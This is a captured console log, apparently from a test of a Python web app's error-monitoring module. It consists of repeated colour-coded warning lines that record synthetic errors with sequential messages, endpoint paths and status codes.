WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803990Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2178'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804038Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2179'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804086Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2180'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2181'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804183Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2182'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2183'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804280Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2184'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804328Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2185'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804375Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2186'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2187'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804541Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2188'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2189'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804654Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2190'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2191'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804753Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2192'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804800Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2193'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2194'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804897Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2195'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804945Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2196'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.804992Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2197'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2198'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805087Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2199'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805136Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2200'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2201'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2202'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2203'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805337Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2204'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805384Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2205'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2206'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805480Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2207'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805527Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2208'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2209'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2210'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805667Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2211'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2212'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805762Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2213'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805809Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2214'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805856Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2215'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805907Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2216'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.805955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2217'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
